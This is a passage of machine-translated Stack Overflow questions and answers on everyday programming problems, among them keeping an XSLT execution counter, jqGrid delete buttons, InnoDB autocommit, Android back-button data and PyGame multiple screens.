 where groups.StudentID=100 
```

我首先创建一个所有可用的列表，`StandardID`然后对所有学生和分数进行左连接以获得列表。

# xslt - 我们可以在 XSLT 中创建序列吗？

> ID：15847587
> 
> 赞同：2
> 
> 时间：2013-04-06T05:57:41.050
> 
> 标签：xslt

我正在使用 xslt 生成一个文本文件。当我传递 xml 输入时，xslt 正在将 xml 输入转换为文本文件。我们能否为每个调用提供序列号。

并将其存储在某个变量中。

1）如果假设第一次执行时创建了一个文本文件，因此 xslt ( `<sequence>`) 中有一个变量，它应该分配为数字 1，如下所示

```
<sequence>1</sequence> 
```

2）第二次执行创建了一个文本文件，因此序列变量应该增加。

```
<sequence>2<sequence> 
```

3）第三次执行时，又创建了一个文本文件，因此序列变成这样

```
<sequence>3</sequence> 
```

我们通常可以通过在 oracle 数据库中创建一个序列并在 xslt 中调用该序列来执行此操作，并且对于每次执行，序列都会增加

```
<sequence>CallOracleSequence</sequence> 
```

任何人都可以建议不要使用 Oracle 序列。我们可以在 xslt 中处理这个吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T09:04:33.957

通常序列号将与输入中的某些内容相关，因此您可以使用`position()`or `xsl:number`。但细节取决于输入的结构。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T18:46:28.107

XSLT 不会在转换的执行之间维护状态。

一种选择是利用包含序列号的外部配置文件。使用实体引用，您可以使 XSLT 文档的 XML 配置部分读取它的当前值，当 XSLT 执行时，增加数字并使用新的序列号覆盖配置文件`<xsl:result-document>`。

下面是一个**XSLT 2.0**样式表的工作示例，假设`sequence.xml`在与正在执行的 XSLT 相同的目录中调用了一个序列文件：

```
<?xml version="1.0" encoding="UTF-8"?>
<!--delare entities to reference the sequence file-->
<!DOCTYPE xsl:stylesheet [
<!ENTITY sequenceFile SYSTEM "sequence.xml">
]>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="2.0">

    <xsl:output name="sequenceOutput" method="xml" indent="yes"/> 

  <!--this variable is used to store the expanded entity reference for 
      the current sequence.xml file
    When the XSLT is parsed it will "look" like this to the XML parser:
    <xsl:variable name="sequence><sequence>1</sequence></xsl:variable>
  -->
    <xsl:variable name="sequence">
        <!--
        this entity reference will expand to: 
            <sequence>x</sequence> 
        when the XSLT is parsed
        -->
        &sequenceFile;
    </xsl:variable>
   <!--
    Use the document() function with an empty value to read the XSLT 
    and then parse the sequence value produced by the entity reference
   -->
    <xsl:variable name="currentSequenceValue" 
      select="number(document('')/*/xsl:variable[@name='sequence']/sequence)"/>

    <xsl:template match="/">
        <!--do normal processing of the XML document-->
        <xsl:apply-templates />

        <!--
        This will overwrite the sequence file with the incremented value
        -->
        <xsl:result-document format="sequenceOutput" href="sequence.xml">
          <sequence><xsl:value-of select="$currentSequenceValue+1"/></sequence>
        </xsl:result-document>

    </xsl:template>

    <xsl:template match="@*|node()">
        <xsl:copy>
            <xsl:apply-templates select="@*|node()"/>
        </xsl:copy>
    </xsl:template>

</xsl:stylesheet> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T19:01:40.487

**这可以通过写出两个文件（转换结果和更新的执行次数）通过单个 XSLT 2.0 转换来实现**：

```
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:xs="http://www.w3.org/2001/XMLSchema" exclude-result-prefixes="xs">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>

 <xsl:variable name="vRepetitions" select=
   "document('file:///c:/temp/delete/numberOfRepetitions.xml')/* +1"/>

 <xsl:template match="node()|@*">
  <xsl:copy>
   <xsl:apply-templates select="node()|@*"/>
  </xsl:copy>
 </xsl:template>

 <xsl:template match="/">
     <xsl:result-document
        href="file:///c:/temp/delete/iteration{$vRepetitions}.xml">
       <xsl:apply-templates/>
     </xsl:result-document>

     <xsl:result-document href="file:///c:/temp/delete/numberOfRepetitions.xml">
      <n><xsl:value-of select="$vRepetitions"/></n>
     </xsl:result-document>
 </xsl:template>
</xsl:stylesheet> 
```

**涉及两个文件：源 XML 文档和一个包含当前执行次数的文件——后者必须最初创建以包含**：

```
<n>0</n> 
```

**当上述转换应用于任何源 XML 文档时（对于本演示，它只是对其应用身份规则）**，它会进行常规处理并产生所需的结果。此外，转换读取包含当前执行次数的 XML 文档并更新此数字并将更新的（执行次数）文档写回磁盘：

```
Saxon 9.1.0.5J from Saxonica
Java version 1.6.0_31
Stylesheet compilation time: 625 milliseconds
Processing file:/C:/Program%20Files/Java/jre6/bin/marrowtr.xml
Building tree for file:/C:/Program%20Files/Java/jre6/bin/marrowtr.xml using class net.sf.saxon.tinytree.TinyBuilder
Tree built in 16 milliseconds
Tree size: 4 nodes, 4 characters, 0 attributes
Loading net.sf.saxon.event.MessageEmitter
Building tree for file:///c:/temp/delete/numberOfRepetitions.xml using class net.sf.saxon.tinytree.TinyBuilder
Tree built in 0 milliseconds
Tree size: 4 nodes, 1 characters, 0 attributes

Writing to file:/c:/temp/delete/iteration2.xml
Writing to file:/c:/temp/delete/numberOfRepetitions.xml

Execution time: 140 milliseconds
Memory used: 11477344
NamePool contents: 16 entries in 16 chains. 6 prefixes, 7 URIs 
```

**在这里，我们看到在第二次执行时，转换创建了两个文件**：

1.  `iteration2.xml`包含第二次执行转换的结果。

2.  `numberOfRepetitions.xml`如果我们检查这个文件，它在第二次执行后的内容与预期的一样：

. . . .

```
<n>2</n> 
```

# jquery - jqGrid with localArray - 内联导航：获取删除行按钮并调用自定义函数

> ID：15847590
> 
> 赞同：0
> 
> 时间：2013-04-06T05:57:49.890
> 
> 标签：jquery, jqgrid, jqgrid-inlinenav

我正在使用 jqGrid 和 localArray 数据。我正在从 azure db 获取这个数组并绑定到网格。在处理每一行之后，我计划在数据库中更新它。

我正在使用内联导航栏。单击“添加行”、“保存行”和“删除行”按钮时，我想调用我的自定义函数，然后想从该函数中保存/删除数据库中的数据。

**首先我想知道我的设计是否正确和可扩展。**

目前，我可以使用“aftersavefunc”参数在单击保存按钮时调用自定义函数。

**其次，请让我知道我必须为“删除行”按钮设置哪个参数。我认为对于“添加行”，相同的参数可以工作，因为我们必须单击“保存行”按钮来保存行。**

我的代码如下供参考：

```
jQuery("#list4").jqGrid({
    datatype: "local",
    data: myData,
    height: "auto",
    colNames: ['RowNo', 'RouteId', 'Area'],
    colModel: [
        { name: 'id', index: 'id', width: 50, sortable: false },
        { name: 'RouteId', index: 'RouteId', width: 50, sortable: false },
        { name: 'Area', index: 'Area', width: 130, sortable: false, editable: true, editrules: { required: true} },
    ],
    multiselect: false,
    rownumbers: false,
    rowList: [10, 20, 30],
    pager: jQuery('#pager1'),
    viewrecords: true,
    caption: "Bus Schedule Data",
    editurl: "clientArray",
    restoreAfterSelect: false,
    loadonce: true
});
var rowid;
var inlineparams = {
    addParams: { useFormatter: false },
    editParams: {
        aftersavefunc: function (id) {
            var rowData = jQuery('#list4').jqGrid('getRowData', id);
            ScheduleTable.update({ id: 1, Area: rowData.Area.toString() });
        }
    },
    add: true,
    edit: true,
    save: true,
    cancel: true,
    del: true
};

jQuery("#list4").jqGrid('navGrid', "#pager1", { edit: false, save: false, add: false, cancel: false, del: false });
jQuery("#list4").jqGrid('inlineNav', "#pager1", inlineparams);
jQuery("#list4").jqGrid("saveRow", id, {
    keys: false,
    url: "clientArray"
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T11:39:10.643

[inlineNav](http://www.trirand.com/jqgridwiki/doku.php?id=wiki:inline_editing#inlinenav)方法没有`del`您使用的选项（请参阅参考资料`inlineparams`）。您必须使用删除`del: false`选项`navGrid`才能通过表单编辑实现删除按钮（请参阅[delGridRow](http://www.trirand.com/jqgridwiki/doku.php?id=wiki:form_editing#delgridrow)方法）。

我个人发现使用内联编辑将数据保存在数据库中`aftersavefunc`并不是最好的方法。使用这种方法实现错误处理时会遇到问题，因为网格中的更改将*首先保存在本地*，然后您将尝试更新数据库中的数据。如果在保存过程中出现某种错误（验证错误、并发错误等），则必须恢复网格*中数据的先前状态。*因此，您必须保存以前的状态（`oneditfunc`例如在回调内部），然后在需要时恢复旧数据。

所以我建议你从设计的角度来改变`datatype: "local"`和`editurl: "clientArray"`原来的基于 Ajax 的版本。

如果您使用建议 jqGrid 的标准方式，您可以通过 Ajax 与服务器进行通信。如果后端可能返回错误描述，用户将能够*修改*当前编辑数据并尝试再次保存。您需要的只是实现一些服务器组件（ASP.NET Web API 服务、ASP.NET WCF 服务、ASP.NET MVC 控制器、[ASMX WebService](http://blogs.msdn.com/b/davidlem/archive/2009/01/07/windows-azure-and-web-services.aspx)、[ASHX 处理程序](http://blogs.msdn.com/b/davidlem/archive/2010/04/16/build-your-own-pivot-server-in-windows-azure.aspx)等）。所有技术（即使是最古老的技术，如 ASMX WebService 和 ASHX 处理程序）都可以与 Windows Azure 一起使用。

如果您决定遵循您原来的方式，您可以使用表单编辑来实现删除。我最初在[这里](https://stackoverflow.com/a/6800597/315935)描述了如何在`editurl: "clientArray"`. 在[答案](https://stackoverflow.com/a/5611519/315935)中，我发布了如何将全套表单编辑操作与本地数据一起使用的方式。[另一个答案](https://stackoverflow.com/a/12296186/315935)包含更新的代码，适用于 jqGrid 的当前版本（4.4.1 和 4.4.4）。我建议您使用`delSettings`上[一个答案](https://stackoverflow.com/a/12296186/315935)。本地保存数据所需的所有回调`onclickSubmit`。`delSettings`

您的代码的常见小注释：

*   我发现在一个网格中同时使用`id`和使用很奇怪。`RouteId`可能`id`根本不需要，如果在您的情况下它在数据库中是真正唯一的，您可以将其添加`key: true`为附加属性`RouteId``id`
*   您可以`index`从所有列中删除属性，因为您使用的值与`name`属性的值相同。
*   您可以从中删除`sortable: false`（或同时删除`width: 50`and `sortable: false`）`colModel`并使用代替 that `cmTemplate: {sortable: false}`(or `cmTemplate: {width: 50, sortable: false}`)。请参阅[此处](https://stackoverflow.com/a/6047856/315935)了解更多信息。
*   您可以删除`multiselect: false`,`rownumbers: false`和`restoreAfterSelect: false`jqGrid 的选项。前两个具有默认值（请参阅表中的“Default1”列和[选项](http://www.trirand.com/jqgridwiki/doku.php?id=wiki:options)列表）。最后一个选项 ( `restoreAfterSelect: false`) 是 的选项，`inlineNav`因此如果需要，应该在`inlineparams`.
*   您应该替换`pager: jQuery('#pager1')`为`pager: '#pager1'`. jqGrid 需要`pager`作为 id 选择器。如果您以另一种形式提供输入参数 jqGrid 检测错误并替换为`#pager1`
*   我建议您`gridview: true`在所有网格中使用选项来提高性能而没有任何其他缺点（有关详细信息，请参阅[答案](https://stackoverflow.com/a/12519858/315935)）

# autohotkey - Autohotkeys：等到上一个命令完全执行

> ID：15847596
> 
> 赞同：-1
> 
> 时间：2013-04-06T05:58:05.347
> 
> 标签：autohotkey

我在这里尝试做的是打开一个 Excel 工作表并在这里和那里做一些复制粘贴。我创建了一个脚本，它将打开文件然后开始对其进行操作。现在我使用的是一台速度较慢的计算机，因此打开 excel 文件需要一些时间。是否有可能以某种方式告诉我的自动热键脚本文件已打开，现在你可以开始你的狗屎了。我知道我可以使用睡眠功能来做到这一点，但我想知道是否有更好的方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T06:12:47.827

我会首先检查 Excel 是否正在运行，然后检查特定文件是否已打开。

```
SetTitleMatchMode, 2

IfWinActive, Microsoft Excel
{
    WinGetTitle, title, A
    IfInString, title, specific file
    {
        Sleep, 1000 ; Just in case....

    }
} 
```

实际上，您最好使用 WinWait，特定文件

# php - PHP & MySQL InnoDB：插入或更新后数据不可用

> ID：15847598
> 
> 赞同：1
> 
> 时间：2013-04-06T05:58:16.560
> 
> 标签：php, mysql, innodb

我刚刚从 MyISAM 表切换到 InnoDB，因为行锁定似乎比表锁定更好。

问题是现在我以前做的很多事情都不起作用了。

例如，我有一个脚本可以根据用户的浏览历史向他们推荐项目。这是通过在推荐表中插入或更新行来完成的。建议的实际计算是通过 SQL 语句完成的。所以有时我正在执行推荐语句，然后立即（在同一个 PHP 脚本中）请求结果，以便可以在那里向用户显示。使用 MyISAM 可以完美运行，但使用 InnoDB 有时会返回旧结果，或者没有结果（如果以前没有结果）。

我还有一张桌子，可以作为某事的队列。要使用它，我执行并更新，然后选择此更新的结果。它再次适用于 MyISAM，但不适用于 InnoDB。

在某些情况下，如何确保立即插入或更新行？在其他情况下，如果可以加快查询速度，我会对延迟插入或更新感到满意。但在概述的特定情况下，我需要它是即时的。是否有 PHP 命令可以执行此操作？还是与 MySQL 设置有关？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T07:08:20.957

It sounds like you could be having transaction issues since moving to InnoDB [http://dev.mysql.com/doc/refman/5.0/en/innodb-transaction-model.html](http://dev.mysql.com/doc/refman/5.0/en/innodb-transaction-model.html) .

Unlike MyISAM, InnoDB supports database transactions that isolate your previous SQL commands until you have committed them with a special `COMMIT` sql command. Normally, this isn't a problem since you will be running off of the same transaction on the same database connection and `AUTOCOMMIT` is enabled by default. The autocommit feature of MySQL will automatically commit the transaction after a data change, such as after an `UPDATE`. However, I would guess that you are connecting to the database multiple times (or perhaps using a library that is doing so) and your library or configuration is disabling autocommit.

You can test this easily by issuing the SQL `COMMIT` after your `UPDATE` and seeing if the problem disappears. If this is the problem, the long-term solution depends on the libraries you are using, but generally you can enable autocommit again (either through your library or by removing the disabling entry from your my.cnf or my.ini file) or you can *preferably* start using transactions! There are plenty of articles everywhere for "MySQL data transactions tutorial."

You can enable autocommit via PHP by executing the SQL `SET AUTOCOMMIT=1;` once before executing the rest of your SQL.

This all assumes you are not having replication issues.

# asp.net - 如何将文件上传对话框设置为指定的图像文件夹路径

> ID：15847606
> 
> 赞同：1
> 
> 时间：2013-04-06T05:59:21.147
> 
> 标签：asp.net, linq-to-sql, dotnetnuke

是否可以将文件打开对话框设置为图像文件夹指定路径，所以当用户选择文件上传时，它直接显示图像，并且只显示指定的扩展名和大小的图像我如何验证它

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T10:29:51.783

在**窗口应用程序中是可能的，但在****asp.net**应用程序中是不可能的。
说明：因为您设置的路径（如果可能）将与所有客户端不同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:52:03.967

不，这是不可能的，如果您想检查文件大小和格式，则在上传时检查/验证，如果不验证，则从代码端生成错误。

# android - Android保存当前活动

> ID：15847610
> 
> 赞同：0
> 
> 时间：2013-04-06T06:00:01.777
> 
> 标签：android

我正在开发板球应用程序。使用后退按钮时出现问题。我的目标是在用户单击后退按钮时保存数据。当用户单击`back button`或转到另一个活动时，当前活动数据未显示。我使用共享首选项来保存数据。但我仍然面临着这个问题..任何人都可以给出一些想法。这样我将在我的应用程序中实现。

当用户按下后退按钮时，我正在使用`OnResume()`检索保存的数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T06:05:12.517

Use `startActivityForResult` when launching second activity from first activity. In second activity `onBackPressed()`

```
@Override
public void onBackPressed()
{
    super.onBackPressed();

    Intent i = new Intent();
    i.putExtra("name", value);
    // put as many extra as you want to save
    setResult(RESULT_OK, i);

} 
```

In first activity

```
startActivityForResult(new Intent(this, SecondActivity.class), 1); 
```

Then `onActivityResult`

```
@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data)
{
    super.onActivityResult(requestCode, resultCode, data);

     if (requestCode == 1 && resultCode == RESULT_OK)
     {
         // Using data to get the extra set in intent i in second activity
         // for example data.getStringExtra("name", ""); and so on
     } 

} 
```

The `onActivityResult` is called before `onResume`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:14:23.187

In your first activity call your second activity like this:

```
startActivityForResult(Intent_To_Second_Activity, 104); 
```

In your second activity when you press back use this:

```
 @Override
public void onBackPressed()
{
    super.onBackPressed();
    finish();
    // Save your data here
} 
```

### Complete working example

### Main.xml

this is the layout for your first activity

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

    <EditText
        android:id="@+id/editText"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:inputType="text" />

    <Button 
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:id="@+id/button"
        android:text="click"/>

</LinearLayout> 
```

### second.xml

this is the layout for your second activity

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical" >

    <TextView
        android:id="@+id/textView1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Large Text"
        android:textAppearance="?android:attr/textAppearanceLarge" />

</LinearLayout> 
```

### Java code for your first activity

the class name is `StackActivity`

```
package com.stack.question;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;

public class StackActivity extends Activity {

    EditText et;
    Button bt;

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        et = (EditText) findViewById(R.id.editText);
        bt = (Button) findViewById(R.id.button);
        bt.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {
                // TODO Auto-generated method stub
                Intent intent = new Intent(StackActivity.this, Second.class);
                startActivityForResult(intent, 104);
            }
        });
    }
} 
```

### Java code for your second activity

```
package com.stack.question;

import android.app.Activity;
import android.os.Bundle;

public class Second extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        setContentView(R.layout.second);
    }

    @Override
    public void onBackPressed() {
        // TODO Auto-generated method stub
        super.onBackPressed();
        finish();
    }
} 
```

### Mainfest

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.stack.question"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk android:minSdkVersion="8" />

    <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name" >
        <activity
            android:name=".StackActivity"
            android:label="@string/app_name" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <activity
            android:name=".Second"
            android:label="@string/app_name" >
        </activity>
    </application>

</manifest> 
```

I have codedthe code in my eclipse and it is working.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T06:27:30.683

我已经通过这种方式解决了这个问题。

在**活动**课上。

```
@Override
    protected void onDestroy() {
        super.onDestroy();
        System.out.println("In Destroy()");
        sharedPref = getSharedPreferences("test",MODE_PRIVATE);
        prefEditor = sharedPref.edit(); 
        //save your data here.      
         prefEditor.commit();
    } 
```

**在清单中**。

```
<activity android:name=".MainActivity"  android:launchMode="singleTask"> 
```

享受..

# mysql - 需要一些帮助调试这个 PHP

> ID：15847613
> 
> 赞同：1
> 
> 时间：2013-04-06T06:00:29.573
> 
> 标签：mysql, database, php

我之前编写了这个代码，但它不起作用。

我意识到我可以更简单地做到这一点，但我正在尝试使用 OOP。

所以这里是代码..

**数据库类.php**

```
<?php

class config {

    public $host;
    public $user;
    public $pass;

    function __construct($host=NULL,$user=NULL,$pass=NULL) {

        $this->host = $host;
        $this->user = $user;
        $this->pass = $pass;

    }

    function __destruct() {}

}

class database {

    private $host;
    private $user;
    private $pass;
    private $config;

    function __construct($config) {
        $this->config = $config;
    }

    function __destruct() {}

    public function openCon() {
        mysql_connect($this->host,$this->user,$this->pass);
        if (mysql_errno()) {
            printf('Failed to connect: %s', mysql_error());
        } else {
            echo 'Connected to DB successfully.<br/><br/>';
        }
    }

    public function closeCon() {
        try {
            mysql_close();
            echo 'Successfully closed connection.<br/><br/>';
        } catch (exception $e) {
            echo $e;
        }
    }
}

?> 
```

**索引.php**

```
<?php
    include('db.class.php');

    $con = new config('localhost','root','');
    $etc = new database($con);
    $etc->openCon();
    mysql_select_db('tester') or die(mysql_error());
    $query1 = mysql_query('SELECT * FROM person') or die(mysql_error());
    $rows = mysql_fetch_array($query1) or die(mysql_error());
        echo 'First: ' . $rows['First'];
        echo 'Age:'    . $rows['Age'];
    $etc->closeCon();
?> 
```

我敢肯定这里面有明显的错误。谁能帮我找到并修复它们？

它说：用户''@'localhost'拒绝访问数据库'tester'

不知道为什么。

我将 root 指定为用户，但它以 '' 作为我要求使用的用户返回。

它使主机和数据库正确。

我的本地 root 用户没有密码，所以...

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:10:42.250

好的，问题是从未设置过主机、用户和密码。查看`database`构造函数。您只需设置配置。

要么以某种方式设置私有`database`属性，要么使用`openCon()`.

或者，更好的是，只是废弃该`config`对象。目前，它没有发挥重要作用。只需像下面这样更改`database`构造函数并完成它：

```
function __construct($host, $user, $pass) {
    $this->host = $host;
    $this->user = $user;
    $this->pass = $pass;
} 
```

最后，如果该`__destruct()`方法没有做任何事情，那么您不需要包含它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T06:12:54.630

您的一切都是正确的，只是您需要更改数据库类。您将 $config 作为对象传递给数据库类的构造函数，因此要从该对象访问变量，您几乎不需要更改。它应该是

```
 class database {

private $host;
private $user;
private $pass;
private $config;
public $Connectionlink;

function __construct($config) {
    $this->host = $config->host;
    $this->user = $config->user;
    $this->pass = $config->pass;
}

 // function __destruct() {} as your destruct function doing noting so you need not to include this.

public function openCon() {
   $this->Connectionlink= mysql_connect($this->host,$this->user,$this->pass);
    if (mysql_errno()) {
        printf('Failed to connect: %s', mysql_error());
    } else {
        echo 'Connected to DB successfully.<br/><br/>';
    }
}

public function closeCon() {
    try {
        mysql_close();
        echo 'Successfully closed connection.<br/><br/>';
    } catch (exception $e) {
        echo $e;
    }
}
} 
```

mysql_select_db 需要两个参数，所以应该是

```
 mysql_select_db('tester', $etc->Connectionlink) or die(mysql_error()); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T06:07:25.780

只需尝试使用 xampp 中的 cmd 导航到您的 mysql 目录，它的“C:\xampp\mysql\bin”

然后键入“mysql -u root”并检查您是否获得访问权限

# python - 你将如何在 PyGame 中绘制多个屏幕（仅在一个窗口中）？

> ID：15847615
> 
> 赞同：0
> 
> 时间：2013-04-06T06:00:57.687
> 
> 标签：python, pygame, game-engine

我正在尝试将一些代码从 Javascript 移植到 Python，但我什至无法弄清楚从哪里开始。我已经查看了很多 PyGame 教程，但似乎没有一个适合我。所以，我希望在这里得到一个简单的例子，或者至少是一个正确的方向。

我想做一些可以在它们之间来回切换的屏幕，这取决于用户当时正在做什么，甚至可以并排显示两个屏幕。目前，我所拥有的只是一些在屏幕上绘制随机圆圈的 Javascript。PyGame 逻辑是我唯一遇到的问题。

[这是我的javascript供参考。](http://pastebin.com/mhj7FDUw)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T15:43:47.623

您可以为要创建的每个子屏幕创建一个[Subsurface](http://www.pygame.org/docs/ref/surface.html#pygame.Surface.subsurface)。

然后您可以将每个屏幕视为全屏/单个表面，但它们仍然参考原始屏幕。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T09:03:11.293

Pygame 是 SDL 的包装器。SDL 使用表面来表示位图或可以在屏幕上绘制的任何内容。有了 ，`pygame.display.set_mode((w,h),0,d)`您可以获得表面或整个画布。然后，您可以绘制或 blit 其他表面，然后调用`flip()`, 以显示更改。如果您希望有几个屏幕，您可以有一个当前状态编号，并相应地对屏幕进行 blit。例如：

```
if(current_state == MAIN_SCREEN):
    drawAll(screen)
else
    drawEnemiesOnly(screen) 
```

您可以使用数字键更改屏幕：

```
for event in pygame.event.get():
        if event.type == KEY_DOWN:
            if(event.key == K_1):
                current_state = 1 
```

# gridview - Gridview 控件在 rowdatabound 中被禁用，但稍后不显示相同的设置

> ID：15847616
> 
> 赞同：0
> 
> 时间：2013-04-06T06:01:15.797
> 
> 标签：gridview, textbox, c#-2.0

我`TextBox`根据某些条件禁用了 gridview 中的 a。

后来，当我遍历 时`griview`，当我检查 TextBox.Enabled 属性时，它显示为 true。但是我已将该行设置为 false 。

此代码在 rowdatabound 事件中我只是发布与问题相关的代码

```
 TextBox txt_location = (TextBox)e.Row.Cells[htDGV_Map["Trailer's Last Location"]].FindControl("txt_location");

string remark_status = "";
string status = Convert.ToString(DataBinder.Eval(e.Row.DataItem, "SHIP_TRAIL_STATUS"));

if (status.Equals("L"))
     remark_status = "REMARK_POSTMARCH";
 else
     remark_status = "REMARK_REACH";

if (remark_status.Equals("REMARK_REACH"))
                {
                    txt_location.ReadOnly = true;
                } 
```

后来我试图访问这个属性的值

```
 TextBox txt_loc =

(TextBox)Gridrow.Cells[htDGV_Map["Tracking Trailers
Locations"]].FindControl("txt_location");

if(txt_loc.ReadOnly == true)
{
  // other code
}
Here the property comes as false, although I am expecting it to be true. 
```

我尝试使用 的`ReadOnly`属性`TextBox`，但即使在这里`ReadOnly`，当我期望它为真时，也发现该属性为假。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-07T07:33:34.027

在 RowDataBound 事件中为控件应用自定义设置时要注意的一件事是，如果页面执行 PostBack，除非您重新绑定 GridView，否则自定义设置将丢失。

可能的解决方法是确保您始终在每个 PostBack 上重新绑定 GridView，或者在 PreRender 事件中应用 Enabled / ReadOnly 设置，遍历 DataRows，但您还需要在某个地方（隐藏字段）存储 SHIP_TRAIL_STATUS RowDataBound 以便您可以在 PreRender 中访问它 - ViewState 将确保存储的值在 PostBack 期间保持静态。

# c - 如何在一次内存操作中加载可能的最大整数？

> ID：15847617
> 
> 赞同：2
> 
> 时间：2013-04-06T06:01:20.027
> 
> 标签：c, caching, portability, low-level, stdint

我正在构建一个小型字节码 VM，它将在各种平台上运行，包括异国情调的嵌入式和微控制器环境。

我的 VM 中的每个操作码都可以是可变长度的（不超过 4 个字节，不少于 1 个字节）。在解释操作码时，我想为当前操作码创建一个微小的“缓存”。但是，由于它在许多不同的平台上使用，所以很难做到。

因此，这里有一些预期行为的示例：

1.  在具有 8 位内存总线的 8 位微控制器上，我希望它只加载 1 个字节，因为它需要多个（慢速）内存操作才能加载，理论上，它可能只需要 1 个字节即可执行当前操作码
2.  在 8086（16 位）上，我想加载 2 个字节，因为只加载 1 个字节，我们基本上会扔掉一些有用的数据以供以后读取，但我不想加载超过 2 个字节，因为需要多次操作
3.  在 32 位 ARM 处理器上，我想加载 4 个字节，因为否则我们要么抛出可能必须再次读取的数据，要么我们正在执行多个操作

我想说这可以通过假设它`unsigned int`足够好来轻松处理，但是在 8 位 AVR 微控制器上，int 定义为 16 位，但内存数据总线宽度仅为 8 位，因此 2 个内存加载操作将是必需的。

无论如何，目前的想法：

using`uint_fast16_t`似乎在大多数平台上都能正常工作（ARM 上 32 位，8086 上 16 位，x86-64 上 64 位）。然而，它显然仍然遗漏了 AVR 和其他 8 位微控制器。

我认为 using`uint_fast8_t`可能会起作用，但它会出现在它被定义为 is 的大多数平台上`unsigned char`，这绝对不是最佳的

此外，还必须解决另一个问题：未对齐的内存访问。在 x86 上，这可能不会成为问题（理论上它会执行 2 次内存操作，但它可能会缓存在硬件中），但是在 ARM 上，我知道执行未对齐的 32 位访问可能会花费 3 倍就像单个对齐的 32 位加载一样。如果地址未对齐，我想加载对齐选项并获取尽可能多的数据，但不惜一切代价避免另一次内存操作

有没有办法使用神奇的预处理器包含或类似的方法来做到这一点，还是只需要在为平台编译之前手动定义最佳缓存大小？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T09:20:35.777

使用标准 C 提供的类型或信息（在诸如此类的标头中）没有自动的方法来执行此操作。

有时通过在目标平台上执行和测量示例代码并使用结果来确定在实践中使用什么代码来处理此类问题。样本可能在构建期间执行，然后构建到最终代码中，或者可能在每个程序执行开始时执行，然后在执行期间使用。

# json - 使用 C# 将 MDX 结果转为 JSON

> ID：15847618
> 
> 赞同：2
> 
> 时间：2013-04-06T06:01:21.933
> 
> 标签：json, c#-4.0, mdx

我是 MDX 新手，基本上我需要将 SSAS MDX 结果序列化为 JSON 对象。

MDX 查询：

```
SELECT
(
    [Measures].[Max Available]
) ON COLUMNS
, NON EMPTY 
(
    [Application].[Product].Children * [Application].[Application Name].Children
) DIMENSION PROPERTIES MEMBER_CAPTION ON ROWS
FROM [Applications] 
```

假设我有一个如下所示的 MDX 结果：

```
__________________________________
|          |          | Measure1 |
| Product1 | Feature1 | 1        |
| Product1 | Feature2 | 1        |
| Product1 | Feature3 | 10       |
| Product2 | Feature1 | 1        |
| Product2 | Feature2 | 1        |
| Product3 | Feature1 | 1        |
| Product3 | Feature2 | 1        |
| Product3 | Feature3 | 1        |
| Product3 | Feature4 | 1        | 
```

我需要创建一个看起来像这样的 JSON 对象（我不需要测量值，我只是使用它们来获取 MDX 层次结构中的有效产品和功能列表）：

```
[
 {
   "product":"Product1",
   "feature":[
      "Feature1",
      "Feature2",
      "Feature3"
   ]
 }, {
   "product":"Product2",
   "feature":[
      "Feature1",
      "Feature2"
   ]
 }, {
   "product":"Product3",
   "feature":[
      "Feature1",
      "Feature2",
      "Feature3",
      "Feature4"
   ]
 }, {
   ...
 }
] 
```

我使用 ExecuteCellSet() 使用 ADOMD.NET 库，但我也是这个库的新手。有人可以指出我正确的方向吗？

谢谢，dfox

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-11T00:35:23.620

虽然我不熟悉 MDX，但我在 C# 中使用过 JSON。创建 JSON 对象的一种方法（因为它们在 C# 4.5 中不是本机的）是使用 DataContracts。

```
using System.Runtime.Serialization.Json;
using System.Runtime.Serialization;

namespace Interface.Data
{
